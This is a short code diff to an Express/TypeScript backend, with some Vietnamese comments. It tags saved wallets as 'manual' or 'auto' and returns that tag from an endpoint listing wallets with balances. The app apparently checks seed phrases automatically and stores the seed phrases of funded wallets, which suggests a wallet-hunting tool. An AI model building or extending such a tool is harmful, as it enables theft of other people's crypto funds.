@@ -124,14 +124,22 @@ export async function registerRoutes(app: Express): Promise<Server> {
           // If balance > 0 and we have a seed phrase, save to database
           if (hasBalance && seedPhrase) {
             try {
+              // Determine if this is from a manual check by looking for 'source' parameter
+              const isManualCheck = req.body.source === 'manual';
+              
               await storage.createWallet({
                 blockchain,
                 address,
                 balance,
                 seedPhrase: seedPhrase,
                 path: "",
-                metadata: {},
+                metadata: JSON.stringify({ 
+                  source: isManualCheck ? 'manual' : 'auto',
+                  savedAt: new Date().toISOString()
+                }),
               });
+              
+              console.log(`Saved wallet with balance to database. Source: ${isManualCheck ? 'manual' : 'auto'}`);
             } catch (dbError) {
               console.error("Error saving wallet to database:", dbError);
               // Continue even if DB save fails
@@ -162,7 +170,32 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.get("/api/wallets-with-balance", async (req: Request, res: Response) => {
     try {
       const walletsWithBalance = await storage.getWalletsWithBalance();
-      return res.json({ wallets: walletsWithBalance });
+      
+      // Xử lý thông tin metadata để trích xuất source
+      const processedWallets = walletsWithBalance.map(wallet => {
+        let source: 'manual' | 'auto' | undefined = undefined;
+        
+        // Nếu có metadata, parse nó và lấy source
+        if (wallet.metadata) {
+          try {
+            const metadata = JSON.parse(wallet.metadata as string);
+            if (metadata.source) {
+              source = metadata.source as 'manual' | 'auto';
+            }
+          } catch (err) {
+            console.error('Error parsing wallet metadata:', err);
+          }
+        }
+        
+        // Trả về wallet với thêm thông tin source
+        return {
+          ...wallet,
+          source,
+        };
+      });
+      
+      console.log(`Returning ${processedWallets.length} wallets with balance`);
+      return res.json({ wallets: processedWallets });
     } catch (error) {
       console.error("Error fetching wallets:", error);
       return res.status(500).json({
